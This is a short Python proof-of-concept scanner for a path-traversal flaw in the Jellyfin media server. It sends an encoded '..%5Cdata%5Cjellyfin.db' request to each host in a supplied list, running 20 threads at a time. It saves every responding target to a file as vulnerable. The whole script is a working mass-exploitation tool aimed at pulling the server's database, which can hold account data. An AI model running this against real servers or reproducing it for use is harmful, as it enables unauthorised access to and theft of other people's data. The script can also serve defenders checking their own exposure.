import requests
import sys
import threadpool
from requests.packages.urllib3.exceptions import InsecureRequestWarning


filename = sys.argv[1]


def POC(url):
    vulpath = "/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/"
    target = "http://" + url + vulpath
    # print("正在请求：".format(target))
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "accept": "application/json",
        "Accept-Encoding":"gzip, deflate",

    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(target,headers=headers)
        if response.status_code == 200:
            print("success!",target)
            output.append(target)
        else:
            pass
    except:
        pass



if __name__ == '__main__':
    output = []
    works = []
    f = open(filename,'r')
    lines = f.readlines()
    for line in lines:
        works.append(line[:-1])
        
    pool = threadpool.ThreadPool(20)
    reqs = threadpool.makeRequests(POC,works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()
    
    ff = open("output.txt",'w')
    for vunltarget in output:
        ff.write(vunltarget+"\n")

    ff.close()
    print("扫描结束!")




